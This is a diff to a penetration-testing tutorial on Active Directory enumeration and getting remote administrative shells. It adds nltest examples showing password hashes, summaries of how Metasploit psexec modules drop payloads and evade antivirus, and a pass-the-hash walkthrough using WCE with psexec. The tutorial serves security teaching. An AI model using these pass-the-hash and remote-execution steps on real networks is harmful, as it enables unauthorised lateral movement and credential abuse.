@@ -2,7 +2,7 @@
 Learning from the field : Active Directory Recon and Administrative shells 
 ===========================================================================
 
-Once, we have access to **credentials of a domain user of windows domain**, we can utilize the credentials to do windows **active directory enumeration** such as figuring out the domain controllers, users, machines, trust etc. This post looks into the various methods which are available to do the enumeration such as rpclient, enum4linux, netdom, powerview, bloodhound, adexplorer, Jexplorer etc.
+Once, we have access to **credentials of a domain user of windows domain**, we can utilize the credentials to do windows **active directory enumeration** such as figuring out the domain controllers, users, machines, trust etc. This post looks into the various methods which are available to do the enumeration such as rpclient, enum4linux, nltest, netdom, powerview, bloodhound, adexplorer, Jexplorer, Remote Server Administration Tools, Microsoft Active Diretory Topology Diagrammer etc.
 
 Also, once we have **administrative credentials** there are multiple ways to get a **execute remote commands** on the remote machine such winexe, crackmapexec, impacket psexec, smbexec, wmiexec, Metasploit psexec, Sysinternals psexec, task scheduler, remote registry, WinRM, WMI, DCOM, remote desktop etc. We have a look over all the methods with possible examples. 
 
@@ -245,6 +245,133 @@ JXplorer
 
 `JXplorer <http://jxplorer.org/>`_ is a cross platform LDAP browser and editor. It is a standards compliant general purpose LDAP client that can be used to search, read and edit any standard LDAP directory, or any directory service with an LDAP or DSML interface.
 
+Remote Server Administration Tools 
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+Active Directory Domain Services (AD DS) Tools and Active Directory Lightweight Directory Services (AD LDS) Tools includes Active Directory Administrative Center; Active Directory Domains and Trusts; Active Directory Sites and Services; Active Directory Users and Computers; ADSI Edit; DCPromo.exe; LDP.exe; NetDom.exe; NTDSUtil.exe; RepAdmin.exe; Active Directory module for Windows PowerShell; DCDiag.exe; DSACLs.exe; DSAdd.exe; DSDBUtil.exe; DSMgmt.exe; DSMod.exe; DSMove.exe; DSQuery.exe; DSRm.exe; GPFixup.exe; KSetup.exe; KtPass.exe; NlTest.exe; NSLookup.exe; W32tm.exe.
+
+Active Directory Administrative Center; Active Directory Domains and Trusts; Active Directory Sites and Services; Active Directory Users and Computers; ADSI Edit;  are GUI tools. These can be installed by installing `Remote Server Administration Tools <https://support.microsoft.com/en-in/help/2693643/remote-server-administration-tools-rsat-for-windows-operating-systems>`_ 
+
+Microsoft Active Directory Topology Diagrammer
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+The `Microsoft Active Directory Topology Diagrammer <https://www.microsoft.com/en-in/download/details.aspx?id=13380>`_ reads an Active Directory configuration using LDAP, and then automatically generates a Visio diagram of your Active Directory and /or your Exchange Server topology. The diagramms may include domains, sites, servers, organizational units, DFS-R, administrative groups, routing groups and connectors and can be changed manually in Visio if needed.
+
+nltest
+^^^^^^^
+
+`Nltest <https://technet.microsoft.com/en-us/library/cc731935(v=ws.11).aspx>`_ is a command-line tool to perform network administrative tasks. We could figure out the Domain Controllers/ Domain Trusts using it. It is built into Windows Server 2008 and Windows Server 2008 R2. It is available if you have the AD DS or the AD LDS server role installed. It is also available if you install the Active Directory Domain Services Tools that are part of the Remote Server Administration Tools (RSAT).
+
+::
+
+ nltest /?
+ Usage: nltest [/OPTIONS]
+
+
+    /SERVER:<ServerName> - Specify <ServerName>
+
+    /QUERY - Query <ServerName> netlogon service
+    /DCLIST:<DomainName> - Get list of DC's for <DomainName>
+    /DCNAME:<DomainName> - Get the PDC name for <DomainName>
+    /DSGETDC:<DomainName> - Call DsGetDcName /PDC /DS /DSP /GC /KDC /TIMESERV /GTIMESERV /WS /NETBIOS /DNS /IP /FORCE /WRITABLE /AVOIDSELF /LDAPONLY /BACKG /DS_6
+        /TRY_NEXT_CLOSEST_SITE /SITE:<SiteName> /ACCOUNT:<AccountName> /RET_DNS /RET_NETBIOS
+    /DNSGETDC:<DomainName> - Call DsGetDcOpen/Next/Close /PDC /GC /KDC /WRITABLE /LDAPONLY /FORCE /SITESPEC
+    /DSGETFTI:<DomainName> - Call DsGetForestTrustInformation /UPDATE_TDO
+    /DSGETSITE - Call DsGetSiteName
+    /DSGETSITECOV - Call DsGetDcSiteCoverage
+    /DSADDRESSTOSITE:[MachineName] - Call DsAddressToSiteNamesEx        /ADDRESSES:<Address1,Address2,...>
+    /PARENTDOMAIN - Get the name of the parent domain of this machine
+    /WHOWILL:<Domain>* <User> [<Iteration>] - See if <Domain> will log on <User>
+    /FINDUSER:<User> - See which trusted domain will log on <User>
+    /USER:<UserName> - Query User info on <ServerName>
+    /TIME:<Hex LSL> <Hex MSL> - Convert NT GMT time to ascii
+    /LOGON_QUERY - Query number of cumulative logon attempts
+    /DOMAIN_TRUSTS - Query domain trusts on <ServerName>
+        /PRIMARY /FOREST /DIRECT_OUT /DIRECT_IN /ALL_TRUSTS /V
+
+Examples:
+
+* Verify domain controllers in a domain
+
+ ::
+ 
+  nltest /dclist:xxx.example.net
+  Get list of DCs in domain 'xxx.example.net' from '\\ABCDEFG.xxx.example.net'.
+        ABCDEFG1.xxx.example.net        [DS] Site: XX-SriLanka
+        ABCDEFG2.xxx.example.net        [DS] Site: XX-India
+        ABCDEFG5.xxx.example.net [PDC]  [DS] Site: XX-Bangladesh
+  The command completed successfully
+
+* Advanced information about users
+
+ ::
+
+  nltest /user:"TestAdmin"
+  User: User1
+  Rid: 0x3eb
+  Version: 0x10002
+  LastLogon: 2ee61c9a 01c0e947 = 5/30/2001 13:29:10
+  PasswordLastSet: 9dad5428 01c0e577 = 5/25/2001 17:05:47
+  AccountExpires: ffffffff 7fffffff = 9/13/30828 19:48:05
+  PrimaryGroupId: 0x201
+  UserAccountControl: 0x210
+  CountryCode: 0x0
+  CodePage: 0x0
+  BadPasswordCount: 0x0
+  LogonCount: 0x33
+  AdminCount: 0x1
+  SecurityDescriptor: 80140001 0000009c 000000ac 00000014 00000044 00300002 000000
+  02 0014c002 01050045 00000101 01000000 00000000 0014c002 000f07ff 00000101 05000
+  000 00000007 00580012 00000003 00240000 00020044 00000501 05000000 00000015 22cd
+  b7b4 7112b3f1 2b3be507 000003eb 00180000 000f07ff 00000201 05000000 00000020 000
+  00220 00140000 0002035b 00000101 01000000 00000000 00000201 05000000 00000020 00
+  000220 00000201 05000000 00000020 00000220
+   AccountName: User1
+  Groups: 00000201 00000007
+  LmOwfPassword: fb890c9c 5c7e7e09 ee58593b d959c681
+  NtOwfPassword: d82759cc 81a342ac df600c37 4e58a478
+  NtPasswordHistory: 00011001
+  LmPasswordHistory: 00010011
+  The command completed successfully
+
+* Determine the PDC emulator for a domain
+
+ ::
+
+  nltest /dcname:fourthcoffee
+  PDC for Domain fourthcoffee is \\fourthcoffee-dc-01
+  The command completed successfully
+
+*  Show trust relationships for a domain
+
+ Returns a list of trusted domains. /Primary /Forest /Direct_Out /Direct_In /All_Trusts /v.
+
+ The following list shows the values that you can use to filter the list of domains.
+
+ * /Primary: Returns only the domain to which the computer account belongs.
+
+ * /Forest: Returns only those domains that are in the same forest as the primary domain.
+
+ * /Direct_Out: Returns only the domains that are explicitly trusted with the primary domain.
+
+ * /Direct_In: Returns only the domains that explicitly trust the primary domain.
+
+ * /All_Trusts: Returns all trusted domains.
+
+ * /v: Displays verbose output, including any domain SIDs and GUIDs that are available.
+
+ ::
+
+  nltest /domain_trusts 
+ 
+  List of domain trusts:
+     0: ABC abc.example.net (NT 5) (Forest: 17) (Direct Outbound) (Direct Inbound)
+     1: DEF def.example.net (NT 5) (Forest: 17) (Direct Outbound) (Direct Inbound)
+     2: IJK IJK.NET (NT 5) (Direct Inbound) ( Attr: 0x8 )
+     3: LMN LMH.net (NT 5) (Direct Outbound) ( Attr: 0x18 )
+     4: APP app.example.net (NT 5) (Forest: 17) (Direct Outbound) (Direct Inbound) ( Attr: 0x20 )
+
+Thanks to `Tanoy Bose <https://twitter.com/tanoybose>`_ for informing me about this. Cheers Bose.
 
 netdom
 ^^^^^^^
@@ -899,7 +1026,41 @@ Let's try also with target 3: MOF Upload
    [*] 10.0.5.180:445 - Created %SystemRoot%\system32\wbem\mof\5SZ1WZENmHyays.MOF
    [*] Exploit completed, but no session was created.
  
- 
+
+**Working of MSF PSexec - Native Upload**
+
+Jonathan has already written awesome detailed blog `Puff Puff PSExec <https://www.toshellandback.com/2017/02/11/psexec/>`_ Working of MSF PSExec has been taken from his blog directly.
+
+While similar in functionality to Sysinternal’s PsExec, the Metasploit Framework’s PSExec Module has a few key differences and at a high-level performs the following actions.  By default, the module takes the following actions:
+
+* Creates a randomly-named service executable with an embedded payload
+* Connects to the hidden ADMIN$ share on the remote system via SMB
+* Drops malicious service executable onto the share
+* Utilizes the SCM to start a randomly-named service
+* Service loads the malicious code into memory and executes it
+* Metasploit payload handler receives payload and establishes session
+* Module cleans up after itself, stopping the service and deleting the executable
+
+There is more flexibility with the Metasploit’s PSExec in comparison to Microsoft’s tool.  For instance, the default location of the malicious service executable can be modified from the hidden ADMIN$ to C$ or even another shared folder on the target machine.  Names of the service executable and associated service can also be changed under the module’s Advanced settings.
+
+However, the most important modification that a penetration tester can make is creating and linking to a custom service executable instead of relying on the executable templates provided by the Metasploit Framework.  Failure to do so greatly increases the risk of detection by the target system’s anti-virus solution once the executable is dropped to disk. 
+
+**Working of MSF PSExec - Powershell**
+
+Details taken directly from Jonathan blog `Puff Puff PSExec <https://www.toshellandback.com/2017/02/11/psexec/>`_
+
+At a high-level, the psexec_psh module works as follows:
+
+* Embed stager into a PowerShell script that will inject the payload into memory
+* Compress and Base64 encode the PowerShell script
+* Wrap encoded script into a PowerShell one-liner that decodes and deflates
+* Connect to ADMIN$ share on target machine over SMB and run the one-liner
+* Embedded script is passed into memory via PowerShell’s Invoke-Expression (IEX)
+* Script creates a new service and passes stager payload into it
+* Metasploit payload handler receives payload and establishes session
+* Module cleans up after itself by tearing down the service
+
+
 Sysinternals psexec
 ^^^^^^^^^^^^^^^^^^^
 
@@ -909,6 +1070,56 @@ Microsoft Sysinternal tool psexec can be downloaded from `PsExec <https://techne
 
  psexec.exe \\Computername -u DomainName\username -p password <command>
  command can be cmd.exe/ ipconfig etc.
+
+**Working of Microsoft PSExec**
+
+The below details are taken from Jonathan blog on `Puff Puff PSExec <https://www.toshellandback.com/2017/02/11/psexec/>`_ 
+
+At a high-level, the PsExec program works as follows:
+
+* Connects to the hidden ADMIN$ share (mapping to the C:\Windows folder) on the remote system via SMB
+* Utilizes the Service Control Manager (SCM) to start the PsExecsvc service and enable a named pipe on the remote system
+* Input/output redirection of the console is achieved via the created named pipe
+
+**Sysinternal PSExec with hashes**
+
+
+Sysinternal PSExec is a tool built to assist system administrators. In order to use PsExec with captured hashes, we would require Windows Credential Editor (WCE).  This would require us to drop another executable to disk and risk detection. Fuzzynop has provided a tutorial `Pass the Hash without Metasploit <http://fuzzynop.blogspot.in/2012/09/pass-hash-without-metasploit.html>`_ 
+
+* Change the current NTLM credentials
+
+ ::
+
+  wce.exe -s <username>:<domain>:<lmhash>:<nthash>
+
+ Example:
+
+ ::
+
+  C:\Users\test>wce.exe -s testuser:amplialabs:01FC5A6BE7BC6929AAD3B435B51404EE:0CB6948805F797BF2A82807973B89537
+
+  WCE v1.2 (Windows Credentials Editor) - (c) 2010,2011 Amplia Security - by Hernan Ochoa (hernan@ampliasecurity.com)
+  Use -h for help.
+
+  Changing NTLM credentials of current logon session (00024E1Bh) to:
+  Username: testuser
+  domain: amplialabs
+  LMHash: 01FC5A6BE7BC6929AAD3B435B51404EE
+  NTHash: 0CB6948805F797BF2A82807973B89537
+  NTLM credentials successfully changed!
+
+
+  C:\Users\test> 
+
+ 
+* Run PSExec normally
+
+ ::
+
+  psexec \\remotecomputer <commandname>
+
+ If you omit a user name, the process will run in the context of your account on the remote system, but will not have access to network resources (because it is impersonating). Specify a valid user name in the Domain\User syntax if the remote process requires access to network resources or to run in a different account. Since, we are omiting the username, it would run in the context of the current username ( The one we have changed with the help of WCE )
+
 
 Task Scheduler
 ^^^^^^^^^^^^^^
@@ -1298,3 +1509,4 @@ Accessing Remote machines:
   Users                              DR        0  Wed Nov 30 20:00:08 2016
   Windows                             D        0  Wed Feb 15 23:18:12 2017
 
+.. disqus::
